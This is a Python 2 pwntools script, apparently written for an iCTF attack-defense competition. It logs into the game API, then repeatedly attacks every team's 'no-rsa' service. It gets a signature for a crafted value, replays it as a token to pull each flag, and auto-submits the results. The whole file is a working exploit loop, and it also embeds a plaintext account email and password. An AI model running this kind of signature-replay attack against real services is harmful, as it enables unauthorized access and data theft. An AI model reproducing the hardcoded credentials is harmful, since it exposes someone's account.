from pwn import *
import time
from ictf import iCTF
i = iCTF()
context.log_level = 'DEBUG'

team = i.login('nmg355@nyu.edu', 'HZBrKynG4XAMvWPa')

def exploit(t):
    with remote(t['hostname'], t['port'], timeout=3) as r:
        r.recvuntil("Type S\n")
        r.sendline("S")
        r.sendline("0"+t['flag_id'])
        r.recvuntil("signature: \n")
        sig = r.recvline()
    with remote(t['hostname'], t['port'], timeout=3) as r:
        r.recvuntil("Type S\n")
        r.sendline("R")
        r.recvuntil("token\n")
        r.sendline(t['flag_id'] + ' ' + sig)
        r.recvuntil(": ")
        return r.recv().strip()

while True:
    time.sleep(team.get_tick_info()['approximate_seconds_left'] + 30)
    flags = []
    for t in team.get_targets(service='no-rsa')['targets']:
        try:
            f = exploit(t)
        except:
            continue
        if f.startswith('FLG'):
            flags.append(f)

    while True:
        try:
            print team.submit_flag(flags)
            break
        except Exception as e:
            print 'got',e,'retrying in 1s'
            time.sleep(1)

